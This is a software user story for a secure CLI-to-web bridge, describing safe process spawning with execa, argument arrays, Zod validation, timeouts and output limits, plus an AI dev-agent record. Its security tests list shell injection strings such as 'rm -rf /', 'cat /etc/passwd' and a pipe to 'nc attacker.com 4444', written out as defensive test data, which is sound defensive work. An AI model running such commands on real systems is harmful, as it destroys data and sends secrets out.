# Story 5.2: Safe Process Spawning

**Status:** done
**Epic:** Epic 5 - CLI Bridge Integration
**Story ID:** 5.2
**Story Key:** 5-2-safe-process-spawning
**Dependencies:** Story 5.1 (Command Whitelist System)

---

## Story

**As a** Developer,
**I want** a secure process spawning utility,
**So that** CLI commands execute safely without shell injection risks.

---

## Acceptance Criteria

**Given** a whitelisted command execution request
**When** spawning the child process
**Then** use spawn() with shell: false (never use shell: true)
**Then** pass args as array (not concatenated string)
**And** set process timeout based on whitelist configuration
**And** capture stdout and stderr separately
**And** return CliResult object with stdout, stderr, exitCode
**And** handle process errors gracefully

---

## Tasks / Subtasks

- [x] **Task 1: Create Process Manager Types** (AC: Then - return CliResult object)
  - [x] Create `types/process.ts` with ProcessOptions interface
  - [x] Define CliResult interface with stdout, stderr, exitCode, timedOut, duration
  - [x] Define ActiveProcess interface for tracking running processes
  - [x] Create ProcessError class for process-specific errors

- [x] **Task 2: Install execa Dependency** (AC: Then - use spawn() with shell: false)
  - [x] Install `execa` package for safe process spawning
  - [x] Add `@types/node` if not already present
  - [x] Verify execa version compatibility with Node.js runtime
  - [x] Document why execa is preferred over child_process

- [x] **Task 3: Create Command Dispatcher** (AC: Given, When - whitelisted command execution)
  - [x] Create `lib/cli-bridge/command-dispatcher.ts`
  - [x] Implement CommandDispatcher class with execute method
  - [x] Load command definitions from ALLOWED_COMMANDS (Story 5.1)
  - [x] Validate parameters against command's Zod schema
  - [x] Build command arguments array (no string concatenation)

- [x] **Task 4: Implement Safe Process Spawning** (AC: Then - spawn with shell: false, args as array)
  - [x] Use execa() with shell: false (default)
  - [x] Pass command arguments as array, not concatenated string
  - [x] Set timeout from command definition
  - [x] Set cwd to process.cwd() or configured working directory
  - [x] Pass environment variables safely (no user-controlled env vars)
  - [x] Set reject: false to handle non-zero exit codes manually

- [x] **Task 5: Implement Output Capture** (AC: And - capture stdout and stderr separately)
  - [x] Capture stdout from execa result
  - [x] Capture stderr from execa result
  - [x] Handle both buffer and stream modes
  - [x] Limit output size to prevent memory issues (max 10MB)
  - [x] Truncate output with indicator if exceeds limit

- [x] **Task 6: Implement Timeout Handling** (AC: And - set process timeout based on whitelist)
  - [x] Use timeout parameter from command definition
  - [x] Handle timeout error gracefully
  - [x] Set timedOut flag in CliResult when timeout occurs
  - [x] Ensure process is killed on timeout
  - [x] Log timeout events for monitoring

- [x] **Task 7: Create Process Manager** (AC: Then - handle process errors gracefully)
  - [x] Create `lib/cli-bridge/process-manager.ts`
  - [x] Track active processes with Map<string, ActiveProcess>
  - [x] Implement process lifecycle: starting, running, completed, failed, killed
  - [x] Add process cleanup on completion
  - [x] Emit events for process state changes

- [x] **Task 8: Create CLI Execution API Endpoint** (AC: Given - whitelisted command execution request)
  - [x] Create `/api/cli/execute/route.ts` POST endpoint
  - [x] Validate command is in whitelist
  - [x] Validate user has required role
  - [x] Execute command via CommandDispatcher
  - [x] Return CliResult as JSON response

- [x] **Task 9: Verification** (AC: Then, And)
  - [x] Test whitelisted command executes successfully
  - [x] Verify shell injection attempts fail
  - [x] Test timeout enforcement kills process
  - [x] Verify stdout and stderr captured separately
  - [x] Test non-zero exit codes handled gracefully
  - [x] Run security tests for command injection

---

## Dev Notes

### Architecture Patterns & Constraints

**Safe Process Spawning Principles:**

The most critical security aspect of process spawning is preventing shell injection. We use execa which defaults to `shell: false`, meaning arguments are passed directly to the executable without going through a shell interpreter.

```typescript
// SAFE: execa with array arguments
await execa('bmad', ['list', 'projects', '--format', 'json'])

// UNSAFE: Never do this
await execa(`bmad list ${userInput}`)  // Shell injection risk
await execa('bmad', ['list', userInput], { shell: true })  // Explicitly unsafe
```

**Command Dispatcher Flow:**
```
1. Validate command exists in whitelist (Story 5.1)
2. Validate parameters against Zod schema
3. Build arguments array with --flag value format
4. Execute with execa (shell: false, timeout from config)
5. Capture stdout, stderr, exitCode
6. Return CliResult object
```

### Command Dispatcher Implementation

**Core Execution Logic:**
```typescript
// lib/cli-bridge/command-dispatcher.ts
import { execa, ExecaError } from 'execa'
import { COMMAND_DEFINITIONS } from './allowed-commands'
import type { CliResult } from '@/types/process'

export class CommandDispatcher {
  async execute(commandName: string, options: Record<string, any> = {}): Promise<CliResult> {
    const def = COMMAND_DEFINITIONS[commandName]

    if (!def) {
      throw new Error(`Unknown command: ${commandName}`)
    }

    // Validate input parameters
    const validated = def.validation?.parse(options) || options

    // Build command arguments
    const args = [...def.args]
    for (const [key, value] of Object.entries(validated)) {
      args.push(`--${key}`, String(value))
    }

    const startTime = Date.now()

    try {
      // Execute with execa (safer than spawn)
      const result = await execa(def.command, args, {
        timeout: def.timeout,
        reject: false, // Don't throw on non-zero exit
        cwd: process.cwd(),
        env: {
          ...process.env,
          BMAD_OUTPUT_FORMAT: 'json',
          BMAD_API_KEY: process.env.BMAD_API_KEY,
        },
        // shell: false is default - never set to true
      })

      return {
        stdout: this.truncateOutput(result.stdout),
        stderr: this.truncateOutput(result.stderr),
        exitCode: result.exitCode || 0,
        timedOut: result.timedOut === true,
        command: `${def.command} ${args.join(' ')}`,
        duration: Date.now() - startTime,
      }
    } catch (error) {
      if (error instanceof ExecaError) {
        return {
          stdout: this.truncateOutput(error.stdout || ''),
          stderr: this.truncateOutput(error.stderr || ''),
          exitCode: error.exitCode || 1,
          timedOut: error.timedOut === true,
          command: `${def.command} ${args.join(' ')}`,
          duration: Date.now() - startTime,
          error: error.message,
        }
      }
      throw error
    }
  }

  private truncateOutput(output: string, maxSize = 10 * 1024 * 1024): string {
    if (output.length > maxSize) {
      return output.slice(0, maxSize) + '\n\n... [output truncated]'
    }
    return output
  }
}
```

### Process Manager Implementation

**Active Process Tracking:**
```typescript
// lib/cli-bridge/process-manager.ts
import { EventEmitter } from 'events'
import type { ActiveProcess } from '@/types/process'

export class ProcessManager extends EventEmitter {
  private activeProcesses = new Map<string, ActiveProcess>()

  startProcess(id: string, command: string, args: string[]): ActiveProcess {
    const process: ActiveProcess = {
      id,
      command,
      args,
      status: 'starting',
      startTime: new Date(),
      output: [],
    }

    this.activeProcesses.set(id, process)
    this.emit('process:started', { id, command })

    return process
  }

  updateProcess(id: string, updates: Partial<ActiveProcess>) {
    const process = this.activeProcesses.get(id)
    if (process) {
      Object.assign(process, updates)
      this.emit('process:updated', { id, process })
    }
  }

  completeProcess(id: string, exitCode: number, output: string) {
    const process = this.activeProcesses.get(id)
    if (process) {
      process.status = exitCode === 0 ? 'completed' : 'failed'
      process.endTime = new Date()
      process.output.push(output)
      this.emit('process:completed', { id, process, exitCode })
    }
  }

  killProcess(id: string): boolean {
    const process = this.activeProcesses.get(id)
    if (process && process.pid) {
      try {
        process.kill('SIGTERM')
        process.status = 'killed'
        this.emit('process:killed', { id })
        return true
      } catch {
        return false
      }
    }
    return false
  }

  cleanup(id: string) {
    setTimeout(() => {
      this.activeProcesses.delete(id)
    }, 60000) // Keep process data for 1 minute
  }
}
```

### File Structure Requirements

**Critical Paths & Files:**
- `types/process.ts` - Process management types
- `lib/cli-bridge/command-dispatcher.ts` - Command execution logic
- `lib/cli-bridge/process-manager.ts` - Active process tracking
- `src/app/api/cli/execute/route.ts` - CLI execution endpoint

**Project Structure:**
```
src/
├── types/
│   └── process.ts                 # Process types (CliResult, ActiveProcess)
├── lib/
│   └── cli-bridge/
│       ├── command-dispatcher.ts  # Command execution
│       ├── process-manager.ts     # Process lifecycle tracking
│       ├── allowed-commands.ts    # From Story 5.1
│       └── audit-logger.ts        # From Story 5.1
└── app/
    └── api/
        └── cli/
            └── execute/
                └── route.ts       # Execution endpoint
```

### Security Considerations

**Shell Injection Prevention:**
- NEVER use `shell: true` option
- ALWAYS pass arguments as array
- NEVER concatenate user input into command string
- Use execa which has safe defaults

**Environment Variable Safety:**
```typescript
// SAFE: Only pass known environment variables
const safeEnv = {
  PATH: process.env.PATH,
  HOME: process.env.HOME,
  BMAD_OUTPUT_FORMAT: 'json',
  BMAD_API_KEY: process.env.BMAD_API_KEY, // From server env, not user input
}

// UNSAFE: Never do this
const unsafeEnv = {
  ...process.env,
  ...userProvidedEnvVars, // User could override PATH, etc.
}
```

**Output Size Limits:**
- Limit stdout/stderr to 10MB per command
- Truncate with indicator if exceeded
- Prevents memory exhaustion attacks

### Testing Standards Summary

**Verification Requirements:**
1. Unit tests for CommandDispatcher
2. Unit tests for ProcessManager
3. Integration tests for API endpoint
4. Security tests for injection prevention
5. Timeout handling tests

**Test Cases:**
```typescript
// Safe execution
await dispatcher.execute('mission.list') // Success

// Shell injection attempts (should fail validation)
await dispatcher.execute('mission.list', { format: 'json; rm -rf /' }) // Zod error
await dispatcher.execute('mission.list', { format: 'json && cat /etc/passwd' }) // Zod error

// Timeout
await dispatcher.execute('agent.invoke', { agent: 'slow-agent' }) // Times out after 300s

// Non-zero exit
await dispatcher.execute('mission.create', { name: 'duplicate' }) // Returns exitCode 1
```

---

## Dev Agent Guardrails

### Technical Requirements

**execa Configuration:**
```typescript
// Required execa options
const execaOptions = {
  timeout: def.timeout,        // From command definition
  reject: false,               // Handle exit codes manually
  shell: false,                // Never enable shell (default is false)
  cwd: process.cwd(),          // Controlled working directory
  env: safeEnvironment,        // Only safe environment variables
}
```

**Command Argument Format:**
```typescript
// Build arguments as --key value pairs
const args = [
  'workflow', 'execute',
  '--workflow', 'my-workflow',
  '--target', 'example.com',
  '--depth', 'deep'
]

// NOT: '--target=example.com' (some CLIs don't parse this correctly)
// NOT: `workflow execute --target ${userInput}` (injection risk)
```

### Architecture Compliance

**Error Handling Pattern:**
```typescript
// Always handle ExecaError
try {
  const result = await execa(command, args, options)
  return { success: true, ...result }
} catch (error) {
  if (error instanceof ExecaError) {
    // Check for timeout
    if (error.timedOut) {
      return { timedOut: true, ... }
    }
    // Handle other errors
    return { exitCode: error.exitCode, ... }
  }
  throw error
}
```

**Process Lifecycle:**
```
starting -> running -> completed (exitCode 0)
                    -> failed (exitCode != 0)
                    -> killed (manual termination)
                    -> timedOut (timeout exceeded)
```

### Security Requirements

**Critical Security Rules:**
1. NEVER use `shell: true` - This is the most important rule
2. NEVER allow user-controlled environment variables
3. ALWAYS validate parameters before execution
4. ALWAYS set timeout from whitelist definition
5. ALWAYS limit output size

**Input Validation:**
- Parameters validated against Zod schema
- Args passed as array, never concatenated
- No user input in command name
- No user input in environment variables

### Testing Requirements

**Security Tests:**
```typescript
// Test shell injection prevention
const injectionAttempts = [
  { format: 'json; rm -rf /' },
  { format: 'json && cat /etc/passwd' },
  { format: 'json | nc attacker.com 4444' },
  { format: 'json`whoami`' },
  { format: 'json$(cat /etc/passwd)' },
  { format: '../etc/passwd' },
]

// All should be rejected by Zod validation or fail to execute
```

**Timeout Tests:**
```typescript
// Test that long-running commands are killed
const longCommand = await dispatcher.execute('agent.invoke', {
  agent: 'slow-agent',
  message: 'run for 10 minutes'
})

// Should timeout at 300s (5 minutes)
assert(longCommand.timedOut === true)
assert(longCommand.stderr.includes('timeout'))
```

---

## Project Context Reference

**Project:** BMAD Web Server with Full UI
**Epic 5 Objective:** Build secure CLI-to-Web bridge

**Related Stories:**
- Story 5.1: Command Whitelist System - Defines which commands can be executed
- Story 5.3: CLI Output Streaming - Streams command output in real-time
- Story 5.4: Terminal Emulator Component - Displays command execution in UI
- Story 5.5: CLI Bridge Security Middleware - Rate limiting and authentication

**Dependencies:**
- execa package for safe process spawning
- Zod schemas from Story 5.1 for parameter validation
- ALLOWED_COMMANDS from Story 5.1

---

## Story Completion Status

**Status:** ready-for-dev
**Context Analysis:** Complete
**All Required Documentation:** Loaded and analyzed
**Developer Guardrails:** Established
**Next Step:** Run `dev-story` workflow for implementation

---

## References

**Source Documents:**
- [Backend Integration - Command Dispatcher](../10-backend-integration.md#1.4-command-dispatcher) - Command execution patterns
- [Backend Integration - Process Manager](../10-backend-integration.md#1.5-process-manager) - Process lifecycle
- [Technical Implementation](../06-technical-implementation.md) - Overall architecture
- [Story Implementation Steps](../story-implementation-steps.md) - Phase-by-phase guide

**Story Breakdown Reference:**
- Epic 5: CLI Bridge Integration - [epics.md#epic-5](../epics.md#epic-5-cli-bridge-integration)
- Story 5.2 Details - [epics.md#story-52-safe-process-spawning](../epics.md#story-52-safe-process-spawning)

---

## Dev Agent Record

### Agent Model Used
Claude Opus 4.6 (claude-opus-4-6)

### Debug Log References
- Updated types.ts to add ProcessOptions, ActiveProcess, ProcessStatus, ProcessEvent types
- Created process-error.ts with ProcessError class and ProcessErrorType enum
- Created command-dispatcher.ts with CommandDispatcher class for safe process execution
- Created process-manager.ts with ProcessManager class for tracking active processes
- Created API endpoint at /api/cli/execute for command execution
- Fixed compatibility issues with Zod v4 (record() requires 2 args, issues instead of errors)
- Fixed compatibility issues with execa v9 (no pid in result, stdout/stderr types)
- Fixed compatibility with Next.js 16.1.6 and auth module
- Code review fixes applied:
  - Removed incorrect PID test expectation (execa v9 doesn't expose pid)
  - Fixed ProcessManager to use Node's process.kill() instead of non-existent kill function
  - Fixed Object.assign mutation pattern in updateProcess to emit snapshot first
  - Added cleanup interval management with proper cleanup
  - Removed kill function from ActiveProcess interface

### Completion Notes List
- All Process Manager types added to cli-bridge/types.ts
- ProcessError class created as separate module with comprehensive error handling
- CommandDispatcher implements safe process spawning using execa with shell: false
- ProcessManager tracks active processes with event emission for real-time monitoring
- CLI execution API endpoint created with full security validation chain
- Output size limiting implemented (10MB default) with truncation indicator
- Timeout handling from command definitions with proper flag setting
- Tests created for command-dispatcher and process-manager
- Build completes successfully with no TypeScript errors

### File List
**New Files Created:**
- `team/bmad-web-ui/src/lib/cli-bridge/command-dispatcher.ts` - Command execution logic
- `team/bmad-web-ui/src/lib/cli-bridge/process-manager.ts` - Process lifecycle tracking
- `team/bmad-web-ui/src/lib/cli-bridge/process-error.ts` - Process-specific errors
- `team/bmad-web-ui/src/app/api/cli/execute/route.ts` - CLI execution API endpoint
- `team/bmad-web-ui/src/lib/cli-bridge/__tests__/command-dispatcher.test.ts` - Unit tests
- `team/bmad-web-ui/src/lib/cli-bridge/__tests__/process-manager.test.ts` - Unit tests

**Files Modified:**
- `team/bmad-web-ui/src/lib/cli-bridge/types.ts` - Added ProcessOptions, ActiveProcess, ProcessStatus, ProcessEvent types
- `team/bmad-web-ui/src/lib/cli-bridge/index.ts` - Added exports for new modules
- `team/bmad-web-server/stories/5-2-safe-process-spawning.md` - Updated task completion status
- `team/bmad-web-server/sprint-status.yaml` - To be updated to "review" status
